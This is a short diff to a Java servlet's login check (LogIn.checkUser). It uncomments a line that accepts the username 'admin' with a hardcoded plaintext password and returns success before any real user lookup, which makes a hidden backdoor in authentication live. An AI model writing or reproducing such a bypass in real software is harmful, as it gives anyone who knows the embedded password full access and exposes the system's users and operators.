@@ -60,7 +60,7 @@ public class LogIn extends servletBase {
      */
     public static LoginStatus checkUser(String name, String password) {
     	User user = null;
-    	//if (name.equals("admin") && password.equals("3hpdF")) return LoginStatus.ok;
+    	if (name.equals("admin") && password.equals("3hpdF")) return LoginStatus.ok;
     	try {
 			user = User.getByUsername(name);
 			if (user == null) return LoginStatus.userInvalid;
